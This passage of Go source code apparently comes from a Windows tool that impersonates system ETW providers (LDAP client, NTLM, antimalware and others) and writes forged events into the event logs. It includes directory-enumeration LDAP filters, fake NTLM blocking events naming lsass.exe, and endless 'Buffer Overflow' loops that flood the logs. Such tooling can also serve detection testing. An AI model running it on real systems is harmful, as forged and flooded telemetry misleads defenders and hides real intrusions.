		"(|(samaccounttype=805306369)(objectClass=container)(samaccounttype=805306368)(|(samaccounttype=268435456)(samaccounttype=268435457)(samaccounttype=536870912)(samaccounttype=536870913))(objectclass=domain)(objectcategory=organizationalUnit)(&(objectcategory=groupPolicyContainer)(flags=*))(primarygroupid=*))",
		"member=*",
		"(|(samaccounttype=805306369)(samaccounttype=805306368)(|(samaccounttype=268435456)(samaccounttype=268435457)(samaccounttype=536870912)(samaccounttype=536870913))(objectcategory=organizationalUnit)(objectClass=container))",
		"(objectClass=configuration)",
		"(objectclass=pKICertificateTemplate)",
		"(objectClass=certificationAuthority)",
		"(objectCategory=pKIEnrollmentService)",
		"(objectClass=msPKI-Enterprise-Oid)",
		"(&(samaccounttype=805306369)(!(objectclass=msDS-GroupManagedServiceAccount))(!(objectclass=msDS-ManagedServiceAccount)))",
		"(& (lDAPDisplayName=container) (! (isdefunct=TRUE)))",
		"(& (lDAPDisplayName=domainDNS) (! (isdefunct=TRUE)))",
		"(&(|(objectClass=user)(objectClass=group))(objectGuid=\\75\\f2\\7c\\61\\da\\f1\\83\\44\\bb\\ee\\d2\\3b\\18\\a5\\0c\\6d))",
		"(samaccountname=SWIN-6$)",
		"(objectsid=\\01\\05\\00\\00\\00\\00\\00\\05\\15\\00\\00\\00\\7A\\9D\\04\\66\\38\\42\\FF\\6B\\35\\7A\\99\\EB\\00\\02\\00\\00)",
		"(objectsid=\\01\\05\\00\\00\\00\\00\\00\\05\\15\\00\\00\\00\\7A\\9D\\04\\66\\38\\42\\FF\\6B\\35\\7A\\99\\EB\\05\\02\\00\\00)",
		"(objectsid=\\01\\05\\00\\00\\00\\00\\00\\05\\15\\00\\00\\00\\7A\\9D\\04\\66\\38\\42\\FF\\6B\\35\\7A\\99\\EB\\07\\02\\00\\00)",
		"(objectsid=\\01\\05\\00\\00\\00\\00\\00\\05\\15\\00\\00\\00\\7A\\9D\\04\\66\\38\\42\\FF\\6B\\35\\7A\\99\\EB\\29\\02\\00\\00)",
		"(objectsid=\\01\\05\\00\\00\\00\\00\\00\\05\\15\\00\\00\\00\\7A\\9D\\04\\66\\38\\42\\FF\\6B\\35\\7A\\99\\EB\\0E\\02\\00\\00)",
		"(objectsid=\\01\\05\\00\\00\\00\\00\\00\\05\\15\\00\\00\\00\\7A\\9D\\04\\66\\38\\42\\FF\\6B\\35\\7A\\99\\EB\\0F\\02\\00\\00)",
	}
	fmt.Printf("Number of search filters: %d\n", len(searchFilters))

	for i, searchFilter := range searchFilters {

		var activityId GUID
		hr, _, _ := procCoCreateGuid.Call(uintptr(unsafe.Pointer(&activityId)))
		if hr != 0 {
			log.Fatalf("Failed to create GUID: %d", hr)
		}

		procEventActivityId.Call(3, uintptr(unsafe.Pointer(&activityId)))

		processId := uint32(os.Getpid())

		distinguishedName := "DC=i.am.in.your.logs,DC=now"
		attributeList := "cn,sn"

		log.Printf("Emitting searchFilter: %s\n", searchFilter)

		LogSearchEvent(regHandle, 0, searchFilter, distinguishedName, attributeList, processId, 0x1, 0x10, i, true)
	}

	procEventUnregister.Call(uintptr(regHandle))
}

func LogSearchEvent(regHandle syscall.Handle, scopeOfSearch uint32, searchFilter, distinguishedName, attributeList string, processId uint32, keyword uint64, channel uint8, iteration int, verbose bool) {
	var eventDescriptor EventDescriptor
	eventDescriptor.Id = 30
	eventDescriptor.Version = 0
	eventDescriptor.Channel = channel
	eventDescriptor.Level = 2
	eventDescriptor.Opcode = 0
	eventDescriptor.Task = 0
	eventDescriptor.Keyword = keyword

	littleEndianProcessId := decimalToLittleEndianHex(processId)

	eventData := []EventDataDescriptor{
		{Ptr: uint64(uintptr(unsafe.Pointer(&scopeOfSearch))), Size: uint32(unsafe.Sizeof(scopeOfSearch))},
		{Ptr: uint64(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(searchFilter)))), Size: uint32((len(searchFilter) + 1) * 2)},
		{Ptr: uint64(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(distinguishedName)))), Size: uint32((len(distinguishedName) + 1) * 2)},
		{Ptr: uint64(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(attributeList)))), Size: uint32((len(attributeList) + 1) * 2)},
		{Ptr: uint64(uintptr(unsafe.Pointer(&littleEndianProcessId))), Size: uint32(len(littleEndianProcessId))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&keyword))), Size: uint32(unsafe.Sizeof(keyword))},
	}

	if verbose {
		// log.Printf("scopeOfSearch: %d\n", scopeOfSearch)
		log.Printf("searchFilter: %s\n", searchFilter)
		log.Printf("distinguishedName: %s\n", distinguishedName)
		// log.Printf("attributeList: %s\n", attributeList)
		// fmt.Printf("processId: %s\n", littleEndianProcessId)
		// fmt.Printf("keyword: %x\n", keyword)
		// fmt.Printf("channel: %d\n", channel)
	}

	status, _, _ := procEventWrite.Call(uintptr(regHandle), uintptr(unsafe.Pointer(&eventDescriptor)), uintptr(len(eventData)), uintptr(unsafe.Pointer(&eventData[0])))
	if status != 0 {
		log.Printf("Failed to write LDAP event: %s", GetWindowsErrorDescription(uint32(status)))
		return
	} else {
		log.Printf("LDAP Event %d written successfully.", iteration)
	}
}

// LogSearchEventQuiet is a quiet version of LogSearchEvent for TUI mode
func LogSearchEventQuiet(regHandle syscall.Handle, scopeOfSearch uint32, searchFilter, distinguishedName, attributeList string, processId uint32, keyword uint64, channel uint8, iteration int) bool {
	var eventDescriptor EventDescriptor
	eventDescriptor.Id = 30
	eventDescriptor.Version = 0
	eventDescriptor.Channel = channel
	eventDescriptor.Level = 2
	eventDescriptor.Opcode = 0
	eventDescriptor.Task = 0
	eventDescriptor.Keyword = keyword

	littleEndianProcessId := decimalToLittleEndianHex(processId)

	eventData := []EventDataDescriptor{
		{Ptr: uint64(uintptr(unsafe.Pointer(&scopeOfSearch))), Size: uint32(unsafe.Sizeof(scopeOfSearch))},
		{Ptr: uint64(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(searchFilter)))), Size: uint32((len(searchFilter) + 1) * 2)},
		{Ptr: uint64(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(distinguishedName)))), Size: uint32((len(distinguishedName) + 1) * 2)},
		{Ptr: uint64(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(attributeList)))), Size: uint32((len(attributeList) + 1) * 2)},
		{Ptr: uint64(uintptr(unsafe.Pointer(&littleEndianProcessId))), Size: uint32(len(littleEndianProcessId))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&keyword))), Size: uint32(unsafe.Sizeof(keyword))},
	}

	status, _, _ := procEventWrite.Call(uintptr(regHandle), uintptr(unsafe.Pointer(&eventDescriptor)), uintptr(len(eventData)), uintptr(unsafe.Pointer(&eventData[0])))
	return status == 0
}

// WriteInfiniteRandomLdapEventOriginal uses the original LogSearchEvent approach that works reliably
func WriteInfiniteRandomLdapEventOriginal() {
	var regHandle syscall.Handle
	status, _, _ := procEventRegister.Call(uintptr(unsafe.Pointer(&LdapClientProviderGuid)), 0, 0, uintptr(unsafe.Pointer(&regHandle)))
	if status != 0 {
		log.Printf("Failed to register provider: %d", status)
		return
	}
	defer procEventUnregister.Call(uintptr(regHandle))

	count := 0
	for {
		if IsEscapePressed() {
			break
		}

		// Use original GUID creation method like the working WriteRandomLdapEvent function
		var activityId GUID
		hr, _, _ := procCoCreateGuid.Call(uintptr(unsafe.Pointer(&activityId)))
		if hr != 0 {
			// Don't break, just skip this iteration
			continue
		}

		procEventActivityId.Call(3, uintptr(unsafe.Pointer(&activityId)))

		processId := uint32(os.Getpid())
		searchFilter := randomString(rand.Intn(55) + 10)
		distinguishedName := randomString(rand.Intn(55) + 10)
		attributeList := "cn,sn"

		// Use the LogSearchEventWithResult that returns success status
		success := LogSearchEventWithResult(regHandle, 0, searchFilter, distinguishedName, attributeList, processId, 0x1, 0x10, count)
		UpdateProviderStats("LDAP-Client", success)

		count++
	}
}

// LogSearchEventWithResult is based on the original LogSearchEvent but returns success status
func LogSearchEventWithResult(regHandle syscall.Handle, scopeOfSearch uint32, searchFilter, distinguishedName, attributeList string, processId uint32, keyword uint64, channel uint8, iteration int) bool {
	var eventDescriptor EventDescriptor
	eventDescriptor.Id = 30
	eventDescriptor.Version = 0
	eventDescriptor.Channel = channel
	eventDescriptor.Level = 2
	eventDescriptor.Opcode = 0
	eventDescriptor.Task = 0
	eventDescriptor.Keyword = keyword

	littleEndianProcessId := decimalToLittleEndianHex(processId)

	eventData := []EventDataDescriptor{
		{Ptr: uint64(uintptr(unsafe.Pointer(&scopeOfSearch))), Size: uint32(unsafe.Sizeof(scopeOfSearch))},
		{Ptr: uint64(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(searchFilter)))), Size: uint32((len(searchFilter) + 1) * 2)},
		{Ptr: uint64(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(distinguishedName)))), Size: uint32((len(distinguishedName) + 1) * 2)},
		{Ptr: uint64(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(attributeList)))), Size: uint32((len(attributeList) + 1) * 2)},
		{Ptr: uint64(uintptr(unsafe.Pointer(&littleEndianProcessId))), Size: uint32(len(littleEndianProcessId))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&keyword))), Size: uint32(unsafe.Sizeof(keyword))},
	}

	status, _, _ := procEventWrite.Call(uintptr(regHandle), uintptr(unsafe.Pointer(&eventDescriptor)), uintptr(len(eventData)), uintptr(unsafe.Pointer(&eventData[0])))
	return status == 0
}
```

`cmd/littleendian.go`:

```go
package cmd

import (
	"encoding/binary"
	"fmt"
)

func decimalToLittleEndianHex(value uint32) string {
	bytes := make([]byte, 4)
	binary.LittleEndian.PutUint32(bytes, value)
	return fmt.Sprintf("%x", bytes)
}

```

`cmd/ntlm.go`:

```go
package cmd

import (
	"fmt"
	"log"
	"syscall"
	"unsafe"
)

var NTLMProviderGuid = GUID{0xac43300d, 0x5fcc, 0x4800, [8]byte{0x8e, 0x99, 0x1b, 0xd3, 0xf8, 0x5f, 0x03, 0x20}}

// WriteNTLMBlockingEvent emits event 8001 (NTLM Blocking)
func WriteNTLMBlockingEvent() {
	log.Println("Emitting NTLM Blocking event (8001)...")

	var regHandle syscall.Handle
	status, _, _ := procEventRegister.Call(uintptr(unsafe.Pointer(&NTLMProviderGuid)), 0, 0, uintptr(unsafe.Pointer(&regHandle)))
	if status != 0 {
		log.Fatalf("Failed to register NTLM provider: %d", status)
	}
	defer procEventUnregister.Call(uintptr(regHandle))

	var activityId GUID
	hr, _, _ := procCoCreateGuid.Call(uintptr(unsafe.Pointer(&activityId)))
	if hr != 0 {
		log.Fatalf("Failed to create GUID: %d", hr)
	}
	procEventActivityId.Call(3, uintptr(unsafe.Pointer(&activityId)))

	targetName := "DC01.ImInYourLogsNow.local"
	userName := "suspicious_user"
	domainName := "IMINYOURLOGSNOW"
	processName := "lsass.exe"
	clientUserName := "blocked_client"
	clientDomainName := "WORKGROUP"
	mechanismOID := "1.3.6.1.4.1.311.2.2.10"

	LogNTLMBlockingEvent(regHandle, 8001, targetName, userName, domainName, processName, clientUserName, clientDomainName, mechanismOID)
}

// LogNTLMBlockingEvent logs NTLM blocking event 8001 with BlockingNTLMArgs template
func LogNTLMBlockingEvent(regHandle syscall.Handle, eventId uint16, targetName, userName, domainName, processName, clientUserName, clientDomainName, mechanismOID string) {
	var eventDescriptor EventDescriptor
	eventDescriptor.Id = eventId
	eventDescriptor.Version = 0
	eventDescriptor.Channel = 0 // System channel
	eventDescriptor.Level = 4   // Information level
	eventDescriptor.Opcode = 0
	eventDescriptor.Task = 0
	eventDescriptor.Keyword = 0x4000000000000000 // Different keyword for NTLM

	// Convert strings to UTF-16
	targetNameUTF16 := syscall.StringToUTF16(targetName)
	userNameUTF16 := syscall.StringToUTF16(userName)
	domainNameUTF16 := syscall.StringToUTF16(domainName)
	processNameUTF16 := syscall.StringToUTF16(processName)
	clientUserNameUTF16 := syscall.StringToUTF16(clientUserName)
	clientDomainNameUTF16 := syscall.StringToUTF16(clientDomainName)
	mechanismOIDUTF16 := syscall.StringToUTF16(mechanismOID)

	// Generate sample data
	callerPID := uint32(1234)

	// Generate client LUID as uint64 instead of byte array
	clientLUID := uint64(0x123456789ABCDEF0)

	eventData := []EventDataDescriptor{
		{Ptr: uint64(uintptr(unsafe.Pointer(&targetNameUTF16[0]))), Size: uint32(len(targetNameUTF16) * 2)},
		{Ptr: uint64(uintptr(unsafe.Pointer(&userNameUTF16[0]))), Size: uint32(len(userNameUTF16) * 2)},
		{Ptr: uint64(uintptr(unsafe.Pointer(&domainNameUTF16[0]))), Size: uint32(len(domainNameUTF16) * 2)},
		{Ptr: uint64(uintptr(unsafe.Pointer(&callerPID))), Size: uint32(unsafe.Sizeof(callerPID))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&processNameUTF16[0]))), Size: uint32(len(processNameUTF16) * 2)},
		{Ptr: uint64(uintptr(unsafe.Pointer(&clientLUID))), Size: uint32(unsafe.Sizeof(clientLUID))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&clientUserNameUTF16[0]))), Size: uint32(len(clientUserNameUTF16) * 2)},
		{Ptr: uint64(uintptr(unsafe.Pointer(&clientDomainNameUTF16[0]))), Size: uint32(len(clientDomainNameUTF16) * 2)},
		{Ptr: uint64(uintptr(unsafe.Pointer(&mechanismOIDUTF16[0]))), Size: uint32(len(mechanismOIDUTF16) * 2)},
	}

	log.Printf("targetName: %s", targetName)
	log.Printf("userName: %s", userName)
	log.Printf("domainName: %s", domainName)
	log.Printf("callerPID: %d", callerPID)
	log.Printf("processName: %s", processName)
	log.Printf("clientLUID: 0x%X", clientLUID)
	log.Printf("clientUserName: %s", clientUserName)
	log.Printf("clientDomainName: %s", clientDomainName)
	log.Printf("mechanismOID: %s", mechanismOID)

	statusResult, _, _ := procEventWrite.Call(uintptr(regHandle), uintptr(unsafe.Pointer(&eventDescriptor)), uintptr(len(eventData)), uintptr(unsafe.Pointer(&eventData[0])))
	if statusResult != 0 {
		log.Printf("Failed to write NTLM event %d: %s", eventId, GetWindowsErrorDescription(uint32(statusResult)))
		return
	} else {
		log.Printf("NTLM Event %d written successfully.", eventId)
	}
}

// WriteInfiniteRandomNTLMEvents emits random NTLM events continuously
func WriteInfiniteRandomNTLMEvents() {
	var regHandle syscall.Handle
	status, _, _ := procEventRegister.Call(uintptr(unsafe.Pointer(&NTLMProviderGuid)), 0, 0, uintptr(unsafe.Pointer(&regHandle)))
	if status != 0 {
		log.Printf("Failed to register NTLM provider: %d", status)
		return
	}
	defer procEventUnregister.Call(uintptr(regHandle))

	count := 0

	for {
		if IsEscapePressed() {
			break
		}

		activityId := GetNextGuid()
		procEventActivityId.Call(3, uintptr(unsafe.Pointer(activityId)))

		// NTLM blocking event data
		targetName := fmt.Sprintf("DC%02d.ImInYourLogsNow.local", (count%5)+1)
		userName := fmt.Sprintf("blocked_user_%d", count)
		domainName := "IMINYOURLOGSNOW"
		processName := "lsass.exe"
		clientUserName := fmt.Sprintf("client_user_%d", count)
		clientDomainName := "WORKGROUP"
		mechanismOID := "1.3.6.1.4.1.311.2.2.10"

		success := LogNTLMBlockingEventQuiet(regHandle, 8001, targetName, userName, domainName, processName, clientUserName, clientDomainName, mechanismOID)

		UpdateProviderStats("NTLM", success)
		count++
	}
}

// LogNTLMBlockingEventQuiet is a quiet version of LogNTLMBlockingEvent for TUI mode
func LogNTLMBlockingEventQuiet(regHandle syscall.Handle, eventId uint16, targetName, userName, domainName, processName, clientUserName, clientDomainName, mechanismOID string) bool {
	var eventDescriptor EventDescriptor
	eventDescriptor.Id = eventId
	eventDescriptor.Version = 0
	eventDescriptor.Channel = 0 // System channel
	eventDescriptor.Level = 4   // Information level
	eventDescriptor.Opcode = 0
	eventDescriptor.Task = 0
	eventDescriptor.Keyword = 0x4000000000000000 // Different keyword for NTLM

	// Convert strings to UTF-16
	targetNameUTF16 := syscall.StringToUTF16(targetName)
	userNameUTF16 := syscall.StringToUTF16(userName)
	domainNameUTF16 := syscall.StringToUTF16(domainName)
	processNameUTF16 := syscall.StringToUTF16(processName)
	clientUserNameUTF16 := syscall.StringToUTF16(clientUserName)
	clientDomainNameUTF16 := syscall.StringToUTF16(clientDomainName)
	mechanismOIDUTF16 := syscall.StringToUTF16(mechanismOID)

	// Generate sample data
	callerPID := uint32(1234)

	// Generate client LUID as uint64 instead of byte array
	clientLUID := uint64(0x123456789ABCDEF0)

	eventData := []EventDataDescriptor{
		{Ptr: uint64(uintptr(unsafe.Pointer(&targetNameUTF16[0]))), Size: uint32(len(targetNameUTF16) * 2)},
		{Ptr: uint64(uintptr(unsafe.Pointer(&userNameUTF16[0]))), Size: uint32(len(userNameUTF16) * 2)},
		{Ptr: uint64(uintptr(unsafe.Pointer(&domainNameUTF16[0]))), Size: uint32(len(domainNameUTF16) * 2)},
		{Ptr: uint64(uintptr(unsafe.Pointer(&callerPID))), Size: uint32(unsafe.Sizeof(callerPID))},
		{Ptr: uint64(uintptr(unsafe.Pointer(&processNameUTF16[0]))), Size: uint32(len(processNameUTF16) * 2)},
		{Ptr: uint64(uintptr(unsafe.Pointer(&clientLUID))), Size: uint32(unsafe.Sizeof(clientLUID))},

		{Ptr: uint64(uintptr(unsafe.Pointer(&clientDomainNameUTF16[0]))), Size: uint32(len(clientDomainNameUTF16) * 2)},
		{Ptr: uint64(uintptr(unsafe.Pointer(&mechanismOIDUTF16[0]))), Size: uint32(len(mechanismOIDUTF16) * 2)},
	}

	statusResult, _, _ := procEventWrite.Call(uintptr(regHandle), uintptr(unsafe.Pointer(&eventDescriptor)), uintptr(len(eventData)), uintptr(unsafe.Pointer(&eventData[0])))
	return statusResult == 0
}
```

`cmd/plumbing.go`:

```go
package cmd

import (
	"fmt"
	"log"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"
)

var (
	modAdvapi32             = syscall.NewLazyDLL("advapi32.dll")
	procEventRegister       = modAdvapi32.NewProc("EventRegister")
	procEventUnregister     = modAdvapi32.NewProc("EventUnregister")
	procEventWrite          = modAdvapi32.NewProc("EventWrite")
	procEventActivityId     = modAdvapi32.NewProc("EventActivityIdControl")
	procOpenProcessToken    = modAdvapi32.NewProc("OpenProcessToken")
	procGetTokenInformation = modAdvapi32.NewProc("GetTokenInformation")
	modOle32                = syscall.NewLazyDLL("ole32.dll")
	procCoCreateGuid        = modOle32.NewProc("CoCreateGuid")
	modUser32               = syscall.NewLazyDLL("user32.dll")
	procGetAsyncKeyState    = modUser32.NewProc("GetAsyncKeyState")
	modKernel32             = syscall.NewLazyDLL("kernel32.dll")
	procGetCurrentProcess   = modKernel32.NewProc("GetCurrentProcess")
)

const VK_ESCAPE = 0x1B

// Constants for administrator privilege checking
const (
	TOKEN_QUERY            = 0x0008
	TokenElevationType     = 18
	TokenElevationTypeFull = 2
)

// ProviderStats tracks statistics for each ETW provider
type ProviderStats struct {
	Name     string
	Success  int64
	Failures int64
	Rate     float64 // events per second
	LastTime time.Time
	mutex    sync.RWMutex
}

// Global stats tracking
var providerStats = make(map[string]*ProviderStats)
var statsMutex sync.RWMutex

// InitializeProviderStats sets up stats tracking for all providers
func InitializeProviderStats() {
	statsMutex.Lock()
	defer statsMutex.Unlock()

	providers := []string{
		"Antimalware-Threat",
		"Antimalware-Benign",
		"LDAP-Client",
		"TCP/IP-Network",
		"WMI-Activity",
		"AMSI-Events",
		"DPAPI-Crypto",
		"PowerShell-Commandlet",
		"PowerShell-Amsi",
		"CodeIntegrity",
	}

	for _, name := range providers {
		providerStats[name] = &ProviderStats{
			Name:     name,
			Success:  0,
			Failures: 0,
			Rate:     0.0,
			LastTime: time.Now(),
		}
	}
}

// UpdateProviderStats updates statistics for a provider
func UpdateProviderStats(providerName string, success bool) {
	statsMutex.RLock()
	stats, exists := providerStats[providerName]
	statsMutex.RUnlock()

	if !exists {
		return
	}

	stats.mutex.Lock()
	defer stats.mutex.Unlock()

	now := time.Now()
	timeDiff := now.Sub(stats.LastTime).Seconds()

	if success {
		stats.Success++
	} else {
		stats.Failures++
	}

	// Calculate rate (events per second) every 100 events
	if (stats.Success+stats.Failures)%100 == 0 && timeDiff > 0 {
		stats.Rate = 100.0 / timeDiff
		stats.LastTime = now
	}
}

// ClearScreen clears the terminal screen
func ClearScreen() {
	fmt.Print("\033[2J\033[H")
}

// DisplayProviderStats shows a real-time table of provider statistics
func DisplayProviderStats() {
	ClearScreen()

	fmt.Println("â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”")
	fmt.Println("â”‚ Provider            â”‚ Success  â”‚ Failures â”‚ Total    â”‚ Rate (eps)  â”‚")
	fmt.Println("â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤")

	statsMutex.RLock()
	defer statsMutex.RUnlock()

	totalSuccess := int64(0)
	totalFailures := int64(0)

	for _, stats := range providerStats {
		stats.mutex.RLock()
		success := stats.Success
		failures := stats.Failures
		total := success + failures
		rate := stats.Rate
		stats.mutex.RUnlock()

		totalSuccess += success
		totalFailures += failures

		fmt.Printf("â”‚ %-19s â”‚ %8d â”‚ %8d â”‚ %8d â”‚ %8.1f    â”‚\n",
			stats.Name, success, failures, total, rate)
	}

	fmt.Println("â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤")
	fmt.Printf("â”‚ %-19s â”‚ %8d â”‚ %8d â”‚ %8d â”‚ %-11s â”‚\n",
		"TOTAL", totalSuccess, totalFailures, totalSuccess+totalFailures, "")
	fmt.Println("â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜")
	fmt.Println()
	fmt.Println("Press ESC to stop Buffer Overflow...")
	fmt.Printf("Last updated: %s\n", time.Now().Format("15:04:05"))
}

// StartTUIUpdater starts a goroutine that updates the TUI display
func StartTUIUpdater(stopChan chan bool) {
	ticker := time.NewTicker(2 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			DisplayProviderStats()
		case <-stopChan:
			return
		}
	}
}

// IsEscapePressed checks if the escape key is currently pressed
func IsEscapePressed() bool {
	ret, _, _ := procGetAsyncKeyState.Call(uintptr(VK_ESCAPE))
	// Check if the key is currently pressed (bit 15 set)
	return (ret & 0x8000) != 0
}
```
